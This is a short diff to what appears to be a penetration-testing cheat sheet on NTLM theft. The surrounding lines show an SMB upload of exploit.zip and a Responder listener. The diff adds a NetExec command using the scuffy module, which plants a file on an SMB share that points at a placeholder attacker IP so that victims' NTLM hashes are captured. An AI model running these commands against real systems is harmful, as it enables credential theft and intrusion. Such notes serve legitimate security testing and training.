@@ -9,6 +9,8 @@ $ python3 poc.py
 smb: \> put exploit.zip
 
 $ sudo responder -I tun0
+
+nxc smb 192.168.0.10 -u 'user' -p 'password' -M scuffy -o SERVER=<attacker_ip> NAME=@test
 ```
 
 # NTLM Theft
